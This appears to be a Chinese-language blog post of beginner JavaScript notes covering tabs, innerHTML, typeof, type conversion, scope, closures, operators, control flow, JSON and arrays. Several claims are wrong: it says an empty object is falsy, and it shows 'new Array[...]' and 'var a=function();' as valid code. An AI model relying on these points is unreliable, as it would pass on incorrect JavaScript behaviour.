<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">window.onload=function ()</div><div class="line">&#123;</div><div class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</div><div class="line">	var aBtn=oDiv.getElementsByTagName(&apos;input&apos;);</div><div class="line">	var aDiv=oDiv.getElementsByTagName(&apos;div&apos;);</div><div class="line">	</div><div class="line">	for(var i=0;i&lt;aBtn.length;i++)</div><div class="line">	&#123;</div><div class="line">		aBtn[i].index=i;</div><div class="line">		aBtn[i].onclick=function ()</div><div class="line">		&#123;</div><div class="line">			for(var i=0;i&lt;aBtn.length;i++)</div><div class="line">			&#123;</div><div class="line">				aBtn[i].className=&apos;&apos;;</div><div class="line">				aDiv[i].style.display=&apos;none&apos;;</div><div class="line">			&#125;</div><div class="line">			this.className=&apos;active&apos;;</div><div class="line">			//alert(this.index);</div><div class="line">			aDiv[this.index].style.display=&apos;block&apos;;</div><div class="line">		&#125;;</div><div class="line">	&#125;</div><div class="line">&#125;;</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
<h2 id="简易日历"><a href="#简易日历" class="headerlink" title="简易日历"></a>简易日历</h2><h3 id="程序实现思路"><a href="#程序实现思路" class="headerlink" title="程序实现思路"></a>程序实现思路</h3><p>(1)类似选项卡，只是下面只有一个div<br>(2)InnerHTML的使用<br>    innerHTML 属性设置或返回表格行的开始和结束标签之间的 HTML。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">window.onload=function ()</div><div class="line">&#123;</div><div class="line">	var oTxt=document.getElementById(&apos;txt1&apos;);</div><div class="line">	var oBtn=document.getElementById(&apos;btn1&apos;);</div><div class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</div><div class="line">	</div><div class="line">	oBtn.onclick=function ()</div><div class="line">	&#123;</div><div class="line">		oDiv.innerHTML=oTxt.value;</div><div class="line">		//alert(oDiv.innerHTML);</div><div class="line">	&#125;;</div><div class="line">&#125;;</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
<h3 id="数组的使用"><a href="#数组的使用" class="headerlink" title="数组的使用"></a>数组的使用</h3><pre><code>数组对象用来在单独的变量名中存储一系列的值。
</code></pre><p> 定义数组：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">var myArray=new Array()</div></pre></td></tr></table></figure>
<p>数组赋值：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">1.</div><div class="line">var mycars=new Array()</div><div class="line">mycars[0]=&quot;Saab&quot;</div><div class="line">mycars[1]=&quot;Volvo&quot;</div><div class="line">mycars[2]=&quot;BMW&quot;</div><div class="line">2.</div><div class="line">var mycars=new Array(&quot;Saab&quot;,&quot;Volvo&quot;,&quot;BMW&quot;)</div></pre></td></tr></table></figure>
<h3 id="字符串连接"><a href="#字符串连接" class="headerlink" title="字符串连接 (+)"></a>字符串连接 (+)</h3><p>作用：连接两个字符串<br>问题：连接中的优先级（用括号改变优先级）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line"></div><div class="line">alert(&apos;abc&apos;+(12+5)+&apos;def&apos;);</div><div class="line"></div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure></p>
<h1 id="JavaScript基础"><a href="#JavaScript基础" class="headerlink" title="JavaScript基础"></a>JavaScript基础</h1><h2 id="JavaScript组成"><a href="#JavaScript组成" class="headerlink" title="JavaScript组成"></a>JavaScript组成</h2><p>   ECMAScript：解释器、翻译<br>   DOM：Document Object Model 操作HTML<br>   BOM：Browser Object Model  操作浏览器<br>  兼容性问题：<br>   ECMA        几乎没有兼容性问题<br>   DOM        有一些操作不兼容<br>   BOM        没有兼容问题（完全不兼容）</p>
<h2 id="变量类型"><a href="#变量类型" class="headerlink" title="变量类型"></a>变量类型</h2><h3 id="类型：typeof运算符"><a href="#类型：typeof运算符" class="headerlink" title="类型：typeof运算符"></a>类型：typeof运算符</h3><p>  用法、返回值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">var a=12;</div><div class="line">typeof a;</div></pre></td></tr></table></figure></p>
<h4 id="变量类型-1"><a href="#变量类型-1" class="headerlink" title="变量类型"></a>变量类型</h4><p>变量本来没有类型，变量类型取决于他保存的类型<br>一个变量应该只存放一种类型的数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">var a=12;</div><div class="line">typeof a;   //number</div><div class="line"></div><div class="line">var a=&apos;abc&apos;;</div><div class="line">typeof a；  //string</div><div class="line"></div><div class="line">var a=function();</div><div class="line">typeof a;  //function</div><div class="line"></div><div class="line">var a=document;</div><div class="line">typeof a;   //object</div><div class="line"></div><div class="line">var b;</div><div class="line">typeof b;   //undefined</div><div class="line"></div><div class="line">//undefined出现的情况</div><div class="line">//1.真的没有定义</div><div class="line">//2.定义了，没有赋值</div></pre></td></tr></table></figure>
<h3 id="数据类型转换"><a href="#数据类型转换" class="headerlink" title="数据类型转换"></a>数据类型转换</h3><p>(1)显式类型转换(强制类型转换)<br>  [1]parseInt() 把非数字的原始值转换成数字<br>   检测方法：<br>   parseInt() 方法首先查看位置 0 处的字符，判断它是否是个有效数字；如果不是，该方法将返回 NaN，不再继续执行其他操作。但如果该字符是有效数字，该方法将查看位置 1 处的字符，进行同样的测试。这一过程将持续到发现非有效数字的字符为止，此时 parseInt() 将把该字符之前的字符串转换成数字。</p>
<pre><code>var iNum1 = parseInt(&quot;12345red&quot;);    //返回 12345
var iNum1 = parseInt(&quot;0xA&quot;);    //返回 10
var iNum1 = parseInt(&quot;56.9&quot;);    //返回 56
var iNum1 = parseInt(&quot;red&quot;);    //返回 NaN  Not a number
</code></pre><p>parseInt() 方法还有基模式，可以把二进制、八进制、十六进制或其他任何进制的字符串转换成整数。基是由 parseInt() 方法的第二个参数指定的，所以要解析十六进制的值，需如下调用 parseInt() 方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">var iNum1 = parseInt(&quot;AF&quot;, 16);	//返回 175</div></pre></td></tr></table></figure>
<p>当然，对二进制、八进制甚至十进制（默认模式），都可以这样调用 parseInt() 方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">var iNum1 = parseInt(&quot;10&quot;, 2);	//返回 2</div><div class="line">var iNum2 = parseInt(&quot;10&quot;, 8);	//返回 8</div><div class="line">var iNum3 = parseInt(&quot;10&quot;, 10);	//返回 10</div></pre></td></tr></table></figure>
<p>  [2]parseFloat()<br>  从位置 0 开始查看每个字符，直到找到第一个非有效的字符为止，然后把该字符之前的字符串转换成整数。<br>  第一个出现的小数点是有效字符。如果有两个小数点，第二个小数点将被看作无效的。parseFloat() 会把这个小数点之前的字符转换成数字。这意味着字符串 “11.22.33” 将被解析成 11.22。<br>  此外，parseFloat() 方法也没有基模式。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">var fNum1 = parseFloat(&quot;12345red&quot;);	//返回 12345</div><div class="line">var fNum2 = parseFloat(&quot;0xA&quot;);	//返回 NaN</div><div class="line">var fNum3 = parseFloat(&quot;11.2&quot;);	//返回 11.2</div><div class="line">var fNum4 = parseFloat(&quot;11.22.33&quot;);	//返回 11.22</div><div class="line">var fNum5 = parseFloat(&quot;0102&quot;);	//返回 102</div><div class="line">var fNum1 = parseFloat(&quot;red&quot;);	//返回 NaN</div></pre></td></tr></table></figure>
<p>(2)NaN的意义和检测</p>
<p>[1]NaN = Not a number<br>[2]NaN和NaN是不相等的<br>[3]is NaN(a) 判断是否为NaN</p>
<h3 id="隐式类型转换"><a href="#隐式类型转换" class="headerlink" title="隐式类型转换"></a>隐式类型转换</h3><p>(1)==、===<br> [1] == 先转换类型，然后比较<br> [2] === 不转换类型，直接比</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">var a=5;</div><div class="line">var b=&apos;5&apos;;</div><div class="line">alert(a==b);	//true		先转换类型，然后比较</div><div class="line">alert(a===b);	//false		不转换类型，直接比</div></pre></td></tr></table></figure>
<p>(2)减法<br>先转换再相减<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">var a=&apos;12&apos;;</div><div class="line">var b=&apos;5&apos;;</div><div class="line"></div><div class="line">alert(a+b);		//1.字符串连接		2.数字相加</div><div class="line">alert(a-b);		//1.数字相减</div></pre></td></tr></table></figure></p>
<h3 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h3><p>局部变量、全局变量</p>
<p>局部作用域<br>变量在函数内声明，变量为局部作用域。<br>局部变量：只能在函数内部访问。</p>
<p>因为局部变量只作用于函数内，所以不同的函数可以使用相同名称的变量。<br>局部变量在函数开始执行时创建，函数执行完后局部变量会自动销毁。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">// 此处不能调用 carName 变量</div><div class="line"></div><div class="line">function myFunction() &#123;</div><div class="line">    var carName = &quot;Volvo&quot;;</div><div class="line"></div><div class="line">    // 函数内可调用 carName 变量</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>（1）全局变量<br>变量在函数外定义，即为全局变量。<br>全局变量有 全局作用域: 网页中所有脚本和函数均可使用。 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">var carName = &quot; Volvo&quot;;</div><div class="line"></div><div class="line">// 此处可调用 carName 变量</div><div class="line"></div><div class="line">function myFunction() &#123;</div><div class="line"></div><div class="line">    // 函数内可调用 carName 变量</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>如果变量在函数内没有声明（没有使用 var 关键字），该变量为全局变量。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"> // 此处可调用 carName 变量</div><div class="line"></div><div class="line">function myFunction() &#123;</div><div class="line">    carName = &quot;Volvo&quot;;</div><div class="line"></div><div class="line">    // 此处可调用 carName 变量</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>（2）闭包<br>子函数可以使用父函数的局部变量</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">function aaa()		//父函数</div><div class="line">&#123;</div><div class="line">	var a=12;</div><div class="line">	</div><div class="line">	function bbb()	//子函数</div><div class="line">	&#123;</div><div class="line">		alert(a);</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">	bbb();</div><div class="line">&#125;</div><div class="line"></div><div class="line">aaa();</div></pre></td></tr></table></figure>
<h3 id="命令规范"><a href="#命令规范" class="headerlink" title="命令规范"></a>命令规范</h3><p>（1）命名规范及必要性<br>  可读性——能看懂<br>  规范性——符合规则</p>
<p>（2）匈牙利命名法<br>  类型前缀（变量取名）</p>
<table>
<thead>
<tr>
<th>类型</th>
<th style="text-align:left">前缀</th>
<th>类型</th>
<th>实例</th>
</tr>
</thead>
<tbody>
<tr>
<td>数组</td>
<td style="text-align:left">a</td>
<td>Array</td>
<td>aItems</td>
</tr>
<tr>
<td>布尔值</td>
<td style="text-align:left">b</td>
<td>Boolean</td>
<td>bIsComplete</td>
</tr>
<tr>
<td>浮点数</td>
<td style="text-align:left">f</td>
<td>Float</td>
<td>fPrice</td>
</tr>
<tr>
<td>函数</td>
<td style="text-align:left">fn</td>
<td>Function</td>
<td>fnHandler</td>
</tr>
<tr>
<td>整数</td>
<td style="text-align:left">i</td>
<td>Integer</td>
<td>iItemCount</td>
</tr>
<tr>
<td>对象</td>
<td style="text-align:left">o</td>
<td>Object</td>
<td>oDiv1</td>
</tr>
<tr>
<td>正则表达式</td>
<td style="text-align:left">re</td>
<td>RegExp</td>
<td>reEmailCheck</td>
</tr>
<tr>
<td>字符串</td>
<td style="text-align:left">s</td>
<td>String</td>
<td>sUserName</td>
</tr>
<tr>
<td>变体变量</td>
<td style="text-align:left">v</td>
<td>Variant</td>
<td>vAnything</td>
</tr>
</tbody>
</table>
<p>  首字母大写</p>
<h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><p>算术：+ 加、- 减、<em> 乘、/ 除、% 取模<br>赋值：=、+=、-=、</em>=、/=、%=<br>关系：&lt;、&gt;、&lt;=、&gt;=、==、===、!=、!==<br>逻辑：&amp;&amp; 与、|| 或、! 否<br>条件：var iMax = (iNum1 &gt; iNum2) ? iNum1 : iNum2;</p>
<p>（1）用于字符串的 + 运算符</p>
<ul>
<li>运算符用于把文本值或字符串变量加起来（连接起来）。</li>
</ul>
<p>如需把两个或多个字符串变量连接起来，请使用 + 运算符。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">txt1=&quot;What a very&quot;;</div><div class="line">txt2=&quot;nice day&quot;;</div><div class="line">txt3=txt1+txt2;</div></pre></td></tr></table></figure>
<p>在以上语句执行后，变量 txt3 包含的值是 “What a verynice day”。</p>
<p>要想在两个字符串之间增加空格，需要把空格插入一个字符串之中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">txt1=&quot;What a very &quot;;</div><div class="line">txt2=&quot;nice day&quot;;</div><div class="line">txt3=txt1+txt2;</div></pre></td></tr></table></figure>
<p>或者把空格插入表达式中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">txt1=&quot;What a very&quot;;</div><div class="line">txt2=&quot;nice day&quot;;</div><div class="line">txt3=txt1+&quot; &quot;+txt2;</div></pre></td></tr></table></figure>
<p>在以上语句执行后，变量 txt3 包含的值是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;What a very nice day&quot;</div></pre></td></tr></table></figure>
<p>（2）对字符串和数字进行加法运算</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">x=5+5;</div><div class="line">document.write(x);  //10</div><div class="line"></div><div class="line">x=&quot;5&quot;+&quot;5&quot;;</div><div class="line">document.write(x);  //55</div><div class="line"></div><div class="line">x=5+&quot;5&quot;;</div><div class="line">document.write(x);  //55</div><div class="line"></div><div class="line">x=&quot;5&quot;+5;</div><div class="line">document.write(x);  //55</div></pre></td></tr></table></figure>
<p>规则是：<br>如果把数字与字符串相加，结果将成为字符串。</p>
<p>（3）运算符优先级</p>
<table>
<thead>
<tr>
<th>运算符</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>. [] ()</td>
<td style="text-align:left">字段访问、数组下标、函数调用以及表达式分组</td>
</tr>
<tr>
<td>++ – - ~ ! delete new typeof void</td>
<td style="text-align:left">一元运算符、返回数据类型、对象创建、未定义值</td>
</tr>
<tr>
<td>* / %</td>
<td style="text-align:left">乘法、除法、取模</td>
</tr>
<tr>
<td>+ - +</td>
<td style="text-align:left">加法、减法、字符串连接</td>
</tr>
<tr>
<td>&lt;&lt; &gt;&gt; &gt;&gt;&gt;</td>
<td style="text-align:left">移位</td>
</tr>
<tr>
<td>&lt; &lt;= &gt; &gt;= instanceof</td>
<td style="text-align:left">小于、小于等于、大于、大于等于、是否为特定类的实例</td>
</tr>
<tr>
<td>== != === !==</td>
<td style="text-align:left">等于、不等于、严格相等、非严格相等</td>
</tr>
<tr>
<td>&amp;</td>
<td style="text-align:left">按位与</td>
</tr>
<tr>
<td>^</td>
<td style="text-align:left">按位异或</td>
</tr>
<tr>
<td>l</td>
<td style="text-align:left">按位或</td>
</tr>
<tr>
<td>&amp;&amp;</td>
<td style="text-align:left">逻辑与</td>
</tr>
<tr>
<td>ll</td>
<td style="text-align:left">逻辑或</td>
</tr>
<tr>
<td>?:</td>
<td style="text-align:left">条件</td>
</tr>
<tr>
<td>= oP=</td>
<td style="text-align:left">赋值、运算赋值</td>
</tr>
<tr>
<td>,</td>
<td style="text-align:left">多重求值</td>
</tr>
</tbody>
</table>
<h2 id="程序流程控制"><a href="#程序流程控制" class="headerlink" title="程序流程控制"></a>程序流程控制</h2><h3 id="判断-if、switch、"><a href="#判断-if、switch、" class="headerlink" title="判断(if、switch、?:)"></a>判断(if、switch、?:)</h3><ul>
<li><p>if</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">if()</div><div class="line">&#123;</div><div class="line">&#125;</div><div class="line">else</div><div class="line">&#123;</div><div class="line">&#125;</div><div class="line"></div><div class="line">if(条件1)</div><div class="line">&#123;</div><div class="line">	语句1</div><div class="line">&#125;</div><div class="line">else if(条件2)</div><div class="line">&#123;</div><div class="line">	语句2</div><div class="line">&#125;</div><div class="line">else</div><div class="line">&#123;</div><div class="line">	语句n</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>switch</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">switch(变量)</div><div class="line">&#123;</div><div class="line">	case 值1:</div><div class="line">		语句1</div><div class="line">		break;</div><div class="line">	case 值2:</div><div class="line">		语句2</div><div class="line">		break;</div><div class="line">	......</div><div class="line">	default:</div><div class="line">		语句n</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>三目条件运算符</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">条件?语句1:语句2</div><div class="line"></div><div class="line">if(条件)</div><div class="line">&#123;</div><div class="line">	语句1</div><div class="line">&#125;</div><div class="line">else</div><div class="line">&#123;</div><div class="line">	语句2</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="循环-while、for"><a href="#循环-while、for" class="headerlink" title="循环(while、for)"></a>循环(while、for)</h3><ul>
<li>while、for<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">while(条件)</div><div class="line">&#123;</div><div class="line">	语句</div><div class="line">&#125;</div><div class="line">   </div><div class="line">   </div><div class="line">   for循环</div><div class="line"></div><div class="line">for(初始化;条件;自增)</div><div class="line">&#123;</div><div class="line">	语句</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="跳出-break、continue"><a href="#跳出-break、continue" class="headerlink" title="跳出(break、continue)"></a>跳出(break、continue)</h3><ul>
<li><p>continue 语句中断循环中的迭代，如果出现了指定的条件，然后继续循环中的下一个迭代。</p>
</li>
<li><p>break 语句可用于跳出循环。break 语句跳出循环后，会继续执行该循环之后的代码（如果有的话）</p>
</li>
</ul>
<h3 id="什么是真、什么是假"><a href="#什么是真、什么是假" class="headerlink" title="什么是真、什么是假"></a>什么是真、什么是假</h3><ul>
<li>真：true、非零数字、非空字符串、非空对象</li>
<li>假：false、数字零、空字符串、空对象、undefined</li>
</ul>
<h2 id="Json"><a href="#Json" class="headerlink" title="Json"></a>Json</h2><h3 id="Json-1"><a href="#Json-1" class="headerlink" title="Json"></a>Json</h3><ul>
<li><p>JSON：JavaScript 对象表示法（JavaScript Object Notation）。</p>
</li>
<li><p>JSON 是存储和交换文本信息的语法。类似 XML。</p>
</li>
<li><p>JSON 比 XML 更小、更快，更易解析。</p>
</li>
</ul>
<h3 id="Json与数组区别"><a href="#Json与数组区别" class="headerlink" title="Json与数组区别"></a>Json与数组区别</h3><ul>
<li><p>下标：Json下标为字符，数组下标为数字</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">var json=&#123;a: 12, b: 5, c: 7&#125;;</div><div class="line">var arr=[12, 5, 7];</div><div class="line"></div><div class="line">alert(json[&apos;a&apos;]);</div><div class="line">alert(arr[0]);</div></pre></td></tr></table></figure>
</li>
<li><p>.length</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">alert(json.length);     错误，json没有length</div><div class="line">alert(arr.length);	  正确，而数组有length</div></pre></td></tr></table></figure>
<ul>
<li>循环</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">for(var i=0;i&lt;arr.length;i++)</div><div class="line">&#123;</div><div class="line">	alert(&apos;第&apos;+i+&apos;个东西：&apos;+arr[i]);</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">for(var i in arr)</div><div class="line">&#123;</div><div class="line">	alert(&apos;第&apos;+i+&apos;个东西：&apos;+arr[i]);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="Json和for-in"><a href="#Json和for-in" class="headerlink" title="Json和for in"></a>Json和for in</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">for(var i in json)</div><div class="line">&#123;</div><div class="line">	alert(&apos;第&apos;+i+&apos;个东西：&apos;+json[i]);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h1 id="深入JavaScript"><a href="#深入JavaScript" class="headerlink" title="深入JavaScript"></a>深入JavaScript</h1><h2 id="函数返回值"><a href="#函数返回值" class="headerlink" title="函数返回值"></a>函数返回值</h2><h3 id="什么是函数返回值"><a href="#什么是函数返回值" class="headerlink" title="什么是函数返回值"></a>什么是函数返回值</h3><ul>
<li>函数的执行结果</li>
<li>可以没有return</li>
</ul>
<h3 id="一个函数应该只返回一种类型的值"><a href="#一个函数应该只返回一种类型的值" class="headerlink" title="一个函数应该只返回一种类型的值"></a>一个函数应该只返回一种类型的值</h3><h2 id="函数传参-1"><a href="#函数传参-1" class="headerlink" title="函数传参"></a>函数传参</h2><h3 id="可变参（不定参）：arguments"><a href="#可变参（不定参）：arguments" class="headerlink" title="可变参（不定参）：arguments"></a>可变参（不定参）：arguments</h3><ul>
<li>参数的个数可变，参数数组</li>
</ul>
<p>在函数代码中，使用特殊对象 arguments，开发者无需明确指出参数名，就能访问它们。<br>arguments 对象检测函数的参数个数，引用属性 arguments.length 即可</p>
<h3 id="取非行间样式-不能用来设置"><a href="#取非行间样式-不能用来设置" class="headerlink" title="取非行间样式(不能用来设置)"></a>取非行间样式(不能用来设置)</h3><ul>
<li>obj.currentStyle[attr]         仅兼容IE</li>
<li>getComputedStyle(obj, false)[attr]          仅兼容火狐，chrome</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">IE</div><div class="line">alert(oDiv.currentStyle.width);</div><div class="line"></div><div class="line">Chrome、FF</div><div class="line">alert(getComputedStyle(oDiv, false).width);      //flase 处参数可以任意</div></pre></td></tr></table></figure>
<h4 id="兼容函数编写"><a href="#兼容函数编写" class="headerlink" title="兼容函数编写"></a>兼容函数编写</h4><ul>
<li><p>style:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">#div1 &#123;width:200px; height:200px; background:red;&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>script:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">function getStyle(obj, name)</div><div class="line">&#123;</div><div class="line">	if(obj.currentStyle)</div><div class="line">	&#123;</div><div class="line">		return obj.currentStyle[name];</div><div class="line">	&#125;</div><div class="line">	else</div><div class="line">	&#123;</div><div class="line">		return getComputedStyle(obj, false)[name];</div><div class="line">	&#125;</div><div class="line">&#125;                  //函数主体</div><div class="line"></div><div class="line">window.onload=function ()</div><div class="line">&#123;</div><div class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</div><div class="line">		</div><div class="line">	//	alert(getStyle(oDiv, &apos;width&apos;));   //单一样式</div><div class="line">	alert(getStyle(oDiv, &apos;backgroundColor&apos;));      //复合样式 background 有图片，颜色等</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="数组基础"><a href="#数组基础" class="headerlink" title="数组基础"></a>数组基础</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><ul>
<li>var arr=[12,5,8,9];</li>
<li>var arr=new Array[12,5,8,9];</li>
<li>没有任何差别，[]的性能略高，因为代码短</li>
</ul>
<h3 id="数组的属性"><a href="#数组的属性" class="headerlink" title="数组的属性"></a>数组的属性</h3><h4 id="length"><a href="#length" class="headerlink" title="length"></a>length</h4><ul>
<li><p>既可以获取长度，又可以设置长度</p>
</li>
<li><p>应用：快速清空数组<br>script:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">var arr=[1,2,3,4,5,6];</div><div class="line"></div><div class="line">arr.length=3;   </div><div class="line"></div><div class="line">alert(arr);  //运行结果为1，2，3</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="数组的方法"><a href="#数组的方法" class="headerlink" title="数组的方法"></a>数组的方法</h3><h4 id="添加"><a href="#添加" class="headerlink" title="添加"></a>添加</h4><ul>
<li>push(元素)，从尾部添加</li>
